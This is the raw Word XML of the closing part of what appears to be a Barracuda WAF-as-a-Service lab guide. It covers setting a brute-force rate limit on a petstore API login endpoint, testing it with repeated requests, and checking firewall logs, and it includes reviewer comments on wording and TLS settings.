      <w:bookmarkStart w:id="112" w:name="_Toc72791992"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>API Rat</w:t>
      </w:r>
      <w:r w:rsidR="00A072A1">
        <w:t>e Limit Protection</w:t>
      </w:r>
      <w:bookmarkEnd w:id="112"/>
    </w:p>
    <w:p w14:paraId="7094BA36" w14:textId="77777777" w:rsidR="00DB6C05" w:rsidRDefault="56702FC2" w:rsidP="00DB6C05">
      <w:r>
        <w:t xml:space="preserve">Another key capability of API protection is rate-limiting so that certain endpoints can be protected from volumetric attacks.  </w:t>
      </w:r>
      <w:r w:rsidR="48688D1E">
        <w:t>We will rate limit the /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="48688D1E">
        <w:t>usr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="48688D1E">
        <w:t xml:space="preserve">/login API endpoint to </w:t>
      </w:r>
      <w:r w:rsidR="00DB6C05">
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidR="48688D1E">
        <w:t>0 requests per second</w:t>
      </w:r>
      <w:r w:rsidR="00DB6C05">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45336A23" w14:textId="1E7BD91A" w:rsidR="00767156" w:rsidRDefault="00767156" w:rsidP="00DB6C05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Make sure the DDOS Component is added, if not, add it now.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FA28A40" w14:textId="4BF9B221" w:rsidR="48688D1E" w:rsidRDefault="48688D1E" w:rsidP="00DB6C05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="38"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Under the DDOS Component, select </w:t>
      </w:r>
      <w:r w:rsidRPr="00DB6C05">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Brute Force</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">.  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79F609D0" w14:textId="3E56EF9E" w:rsidR="48688D1E" w:rsidRDefault="48688D1E" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Click “</w:t>
      </w:r>
      <w:r w:rsidRPr="00DB6C05">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Add Policy</w:t>
      </w:r>
      <w:r>
        <w:t>”</w:t>
      </w:r>
      <w:r w:rsidR="00662E89">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78A2D30E" w14:textId="2C5C1783" w:rsidR="48688D1E" w:rsidRDefault="48688D1E" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Add the URL </w:t>
      </w:r>
      <w:r w:rsidRPr="002B3A4B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="272CCB5C" w:rsidRPr="002B3A4B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>api</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="272CCB5C" w:rsidRPr="002B3A4B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>/v3/</w:t>
      </w:r>
      <w:r w:rsidRPr="002B3A4B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>us</w:t>
      </w:r>
      <w:r w:rsidR="03D02026" w:rsidRPr="002B3A4B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r w:rsidRPr="002B3A4B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>r/login</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DD8D557" w14:textId="625D3277" w:rsidR="48688D1E" w:rsidRDefault="00DB6C05" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">For </w:t>
      </w:r>
      <w:r w:rsidR="48688D1E">
        <w:t xml:space="preserve">the User-Agent </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">field, enter: </w:t>
      </w:r>
      <w:r w:rsidR="48688D1E" w:rsidRPr="00DB6C05">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>*</w:t>
      </w:r>
      <w:r w:rsidR="48688D1E">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B729C8B" w14:textId="61A2DCD4" w:rsidR="48688D1E" w:rsidRPr="00A037AA" w:rsidRDefault="48688D1E" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Set the Block List criteria to</w:t>
      </w:r>
      <w:r w:rsidR="06E00B15">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006B7828">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="00DB6C05">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>0 Valid</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r w:rsidRPr="00DB6C05">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>6 Invalid</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> requests with </w:t>
      </w:r>
      <w:r w:rsidRPr="00DB6C05">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">60 seconds </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">then click </w:t>
      </w:r>
      <w:r w:rsidRPr="00DB6C05">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Add</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FFE9306" w14:textId="413FB562" w:rsidR="00A037AA" w:rsidRDefault="00A037AA" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Wait a few minutes for WAF-as-a-Service to Update</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F6609F9" w14:textId="556409D1" w:rsidR="2DE545DF" w:rsidRDefault="2DE545DF" w:rsidP="00662E89">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7D9C7EC0" wp14:editId="42D93C82">
            <wp:extent cx="5943600" cy="647700"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="452222282" name="Picture 45222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22228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0B81D417" w14:textId="23DB5F5F" w:rsidR="00662E89" w:rsidRDefault="007B3BC3" w:rsidP="00662E89">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="37"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Browse to your </w:t>
      </w:r>
      <w:r w:rsidRPr="00435706">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>CNAME</w:t>
      </w:r>
      <w:r w:rsidR="00662E89">
        <w:t xml:space="preserve">, for example:  </w:t>
      </w:r>
      <w:hyperlink r:id="rId89" w:history="1">
        <w:r w:rsidR="00662E89" w:rsidRPr="006B31C7">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>http://app######.prod.cudawaas.com/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="19AB47EA" w14:textId="218A54EC" w:rsidR="00510213" w:rsidRPr="00510213" w:rsidRDefault="00510213" w:rsidP="00D3591F">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="37"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You will see the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>petstore</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> API application</w:t>
      </w:r>
      <w:r w:rsidR="00686F14">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00686F14">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="013F8369" wp14:editId="0F379C6B">
            <wp:extent cx="3780268" cy="713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80268" cy="713952"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C769DAF" w14:textId="1DC9333F" w:rsidR="005A2E9B" w:rsidRPr="00D3591F" w:rsidRDefault="005A2E9B" w:rsidP="00D3591F">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="37"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Scroll down </w:t>
      </w:r>
      <w:r w:rsidR="0029792D">
        <w:t xml:space="preserve">and click </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="0029792D">
        <w:t xml:space="preserve">on </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>user</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>/login</w:t>
      </w:r>
      <w:r w:rsidR="00510213">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="0029792D">
        <w:t xml:space="preserve">then click on </w:t>
      </w:r>
      <w:r w:rsidR="0029792D" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Try it Out</w:t>
      </w:r>
      <w:r w:rsidR="0029792D">
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidR="0029792D" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Execute</w:t>
      </w:r>
      <w:r w:rsidR="00510213">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0C42F3C6" wp14:editId="4B64AED2">
            <wp:extent cx="4683895" cy="621601"/>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0">
                      <a:extLst>
                        <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                          <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                        </a:ext>
                      </a:extLst>
                    </a:blip>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4683895" cy="621601"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="66E6B3F6" w14:textId="136EB55B" w:rsidR="00A072A1" w:rsidRPr="00DB6C05" w:rsidRDefault="00E00528" w:rsidP="00D3591F">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="37"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Click on </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Execute </w:t>
      </w:r>
      <w:r w:rsidR="0F6DBFD0" w:rsidRPr="00DB6C05">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A33D7F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>at</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00A33D7F">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> least </w:t>
      </w:r>
      <w:r w:rsidR="006B7828">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">0 </w:t>
      </w:r>
      <w:r w:rsidR="0F6DBFD0" w:rsidRPr="00DB6C05">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">more </w:t>
      </w:r>
      <w:r w:rsidR="0F6DBFD0" w:rsidRPr="00DB6C05">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">times, at a rate of about 1 refresh per second. </w:t>
      </w:r>
      <w:r w:rsidR="5DF26687" w:rsidRPr="00DB6C05">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="004B399C" w14:textId="3D1DCB43" w:rsidR="0F6DBFD0" w:rsidRDefault="0F6DBFD0" w:rsidP="00D3591F">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="37"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">After the </w:t>
      </w:r>
      <w:r w:rsidR="006B7828">
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidR="006B7828">
        <w:t>th</w:t>
      </w:r>
      <w:r>
        <w:t>, you will be blocked by WAF</w:t>
      </w:r>
      <w:r w:rsidR="5B42755F">
        <w:t>-as-a-Service</w:t>
      </w:r>
      <w:r w:rsidR="66DFA146">
        <w:t xml:space="preserve">, because you have exceeded the </w:t>
      </w:r>
      <w:r w:rsidR="00A072A1">
        <w:t>R</w:t>
      </w:r>
      <w:r w:rsidR="66DFA146">
        <w:t xml:space="preserve">ate </w:t>
      </w:r>
      <w:r w:rsidR="00A072A1">
        <w:t>L</w:t>
      </w:r>
      <w:r w:rsidR="66DFA146">
        <w:t xml:space="preserve">imit for this </w:t>
      </w:r>
      <w:r w:rsidR="00A33D7F">
        <w:t xml:space="preserve">API </w:t>
      </w:r>
      <w:r w:rsidR="66DFA146">
        <w:t xml:space="preserve">endpoint.  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58DFABA9" w14:textId="0CC6C633" w:rsidR="5B42755F" w:rsidRDefault="5B42755F" w:rsidP="00D3591F">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="37"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Verify the blocked attack by examining the Firewall Logs</w:t>
      </w:r>
      <w:r w:rsidR="00172641">
        <w:t xml:space="preserve"> in WAF-as-a-Service:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CBFC2C8" w14:textId="5A1B16C0" w:rsidR="5B42755F" w:rsidRDefault="5B42755F" w:rsidP="00662E89">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4BBB61E1" wp14:editId="0F90CBC6">
            <wp:extent cx="5300507" cy="1333621"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1555704762" name="Picture 155570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70476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300507" cy="1333621"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4640DADB" w14:textId="434B64B2" w:rsidR="55E0BB2E" w:rsidRDefault="55E0BB2E" w:rsidP="00172641"/>
    <w:p w14:paraId="4001DB37" w14:textId="76226023" w:rsidR="00D04303" w:rsidRPr="00662E89" w:rsidRDefault="0045382E" w:rsidP="00662E89">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
      <w:bookmarkStart w:id="113" w:name="_Toc72791993"/>
      <w:bookmarkStart w:id="114" w:name="_Toc1532082886"/>
      <w:r w:rsidR="00D04303">
        <w:lastRenderedPageBreak/>
        <w:t>Finishing Up</w:t>
      </w:r>
      <w:bookmarkEnd w:id="113"/>
    </w:p>
    <w:p w14:paraId="189A3582" w14:textId="3611B29D" w:rsidR="00D04303" w:rsidRDefault="00CE000C" w:rsidP="00D04303">
      <w:r>
        <w:t>Spend a few minutes r</w:t>
      </w:r>
      <w:r w:rsidR="00D04303">
        <w:t>eview</w:t>
      </w:r>
      <w:r>
        <w:t>ing</w:t>
      </w:r>
      <w:r w:rsidR="00D04303">
        <w:t xml:space="preserve"> the Dashboard and Firewall Log</w:t>
      </w:r>
      <w:r w:rsidR="005272B9">
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidR="007F69D6">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4826F87B" w14:textId="09C7B19A" w:rsidR="007F69D6" w:rsidRDefault="007F69D6" w:rsidP="00D04303">
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="35D20DBB" wp14:editId="2A243A9B">
            <wp:extent cx="5943600" cy="3387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2">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4CF51E76" w14:textId="3D755EB3" w:rsidR="007F69D6" w:rsidRDefault="005272B9" w:rsidP="00D04303">
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5ABECB26" wp14:editId="6D0C3E14">
            <wp:extent cx="594360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3">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540CA6C1" w14:textId="77777777" w:rsidR="005272B9" w:rsidRDefault="005272B9">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
          <w:color w:val="365F91" w:themeColor="accent1" w:themeShade="BF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="2448FD7F" w14:textId="390877BC" w:rsidR="1A3BB3AD" w:rsidRDefault="00CA04DC" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="115" w:name="_Toc72791994"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>THE END</w:t>
      </w:r>
      <w:bookmarkEnd w:id="114"/>
      <w:bookmarkEnd w:id="115"/>
    </w:p>
    <w:p w14:paraId="6685CE88" w14:textId="77777777" w:rsidR="00211169" w:rsidRPr="00172641" w:rsidRDefault="00211169" w:rsidP="00211169">
      <w:r w:rsidRPr="00172641">
        <w:t>To learn more about WAF-as-a-Service, visit the landing page:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="365122EE" w14:textId="77777777" w:rsidR="00211169" w:rsidRDefault="00211169" w:rsidP="0696E29C">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="SimSun" w:hAnsi="Cambria" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="365F91" w:themeColor="accent1" w:themeShade="BF"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId94">
        <w:r w:rsidRPr="0696E29C">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>https://www.barracuda.com/waf-as-a-service</w:t>
        </w:r>
      </w:hyperlink>
      <w:commentRangeStart w:id="116"/>
      <w:commentRangeEnd w:id="116"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="116"/>
      </w:r>
      <w:commentRangeStart w:id="118"/>
      <w:commentRangeEnd w:id="118"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="118"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="61B5D109" w14:textId="77777777" w:rsidR="00211169" w:rsidRDefault="00211169" w:rsidP="00211169">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Cambria" w:eastAsia="SimSun" w:hAnsi="Cambria" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="365F91" w:themeColor="accent1" w:themeShade="BF"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t>The main WAF-as-a-Service documentation can be found here:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1721388A" w14:textId="77777777" w:rsidR="00211169" w:rsidRDefault="002D2B05" w:rsidP="00211169">
      <w:hyperlink r:id="rId95">
        <w:r w:rsidR="00211169" w:rsidRPr="55E0BB2E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://campus.barracuda.com/product/WAAS/doc/77399164/getting-started</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="14E62903" w14:textId="77777777" w:rsidR="00211169" w:rsidRPr="00211169" w:rsidRDefault="00211169" w:rsidP="00211169"/>
    <w:sectPr w:rsidR="00211169" w:rsidRPr="00211169" w:rsidSect="00687CC0">
      <w:headerReference w:type="default" r:id="rId96"/>
      <w:footerReference w:type="default" r:id="rId9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itzan Miron" w:date="2021-05-13T08:44:00Z" w:initials="NM">
    <w:p w14:paraId="4E701616" w14:textId="5A193A08" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="00172641">
      <w:r>
        <w:t>Update to reflect that the user will not be deploying this themselves.</w:t>
      </w:r>
      <w:r>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:annotationRef/>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="3" w:author="Brett" w:date="2021-05-13T08:52:00Z" w:initials="BW">
    <w:p w14:paraId="323AF5E3" w14:textId="161959A9" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="00172641">
      <w:r>
        <w:t>Will do as soon as I see that working</w:t>
      </w:r>
      <w:r>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:annotationRef/>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="18" w:author="Aravindan Anandan" w:date="2021-05-07T19:37:00Z" w:initials="AA">
    <w:p w14:paraId="2E64291A" w14:textId="77777777" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="006D3634">
      <w:r>
        <w:t xml:space="preserve">The current default </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>ssl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> configuration has tls1.3 enabled on </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>WaaS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">. this can cause problems if we are using a different domain name to access the application. </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>So</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> we need to introduce another step to disable </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>tls</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> 1.3 in the configuration.</w:t>
      </w:r>
      <w:r>
        <w:annotationRef/>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="23" w:author="Tushar Richabadas" w:date="2021-05-07T16:41:00Z" w:initials="TR">
    <w:p w14:paraId="6D59CA07" w14:textId="58524576" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="00172641">
      <w:r>
        <w:t>We should use one term consistently across the document, preferably WAF-as-a-Service.</w:t>
      </w:r>
      <w:r>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:annotationRef/>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="24" w:author="Brett" w:date="2021-05-07T08:36:00Z" w:initials="BW">
    <w:p w14:paraId="088A5185" w14:textId="215595CA" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="00172641">
      <w:r>
        <w:t xml:space="preserve">Yes, thank you and I will do that now.  However, because the user is going to run across the term </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>WAFaaS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> or WAAS I am going to add a small note in the introduction that one may see the solution referred to in </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>it's</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> short forms </w:t>
      </w:r>
      <w:r>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:annotationRef/>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="25" w:author="Brett" w:date="2021-05-13T08:58:00Z" w:initials="BW">
    <w:p w14:paraId="6C6ADC87" w14:textId="470CA035" w:rsidR="002D2B05" w:rsidRDefault="002D2B05" w:rsidP="00172641">
      <w:r>
        <w:t xml:space="preserve">Now all occurrences are: WAF-as-a-Service </w:t>
      </w:r>
      <w:r>
        <w:annotationRef/>
      </w:r>
      <w:r>
        <w:annotationRef/>
      </w:r>
    </w:p>
  </w:comment>
  <w:comment w:id="30" w:author="Aravindan Anandan" w:date="2021-05-25T21:38:00Z" w:initials="AA">
    <w:p w14:paraId="11844206" w14:textId="1B931333" w:rsidR="002D2B05" w:rsidRDefault="002D2B05">
      <w:pPr>
        <w:pStyle w:val="CommentText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
